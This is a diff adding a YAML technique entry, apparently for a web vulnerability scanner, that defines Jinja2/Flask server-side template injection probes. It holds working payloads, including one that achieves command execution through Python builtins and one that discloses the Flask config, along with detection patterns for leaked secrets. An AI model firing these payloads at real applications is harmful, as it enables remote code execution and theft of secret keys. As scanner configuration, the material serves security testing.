@@ -1,0 +1,25 @@
+techniques:
+  - id: ssti_jinja2
+    name: "SSTI - Jinja2"
+    vuln_type: ssti
+    description: "Server-side template injection for Jinja2/Flask"
+    severity: critical
+    technology: ["python", "flask", "jinja2"]
+    depth: standard
+    tags: ["ssti", "jinja2", "python"]
+    payloads:
+      - value: "{{7*7}}"
+        description: "Basic arithmetic (expect 49)"
+      - value: "{{config}}"
+        description: "Flask config disclosure"
+      - value: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+        description: "RCE via builtins"
+      - value: "{{''.__class__.__mro__[1].__subclasses__()}}"
+        description: "Class hierarchy traversal"
+    detection:
+      - type: string
+        value: "49"
+        description: "Arithmetic evaluation result"
+      - type: regex
+        value: "SECRET_KEY|DEBUG"
+        description: "Flask config leaked"
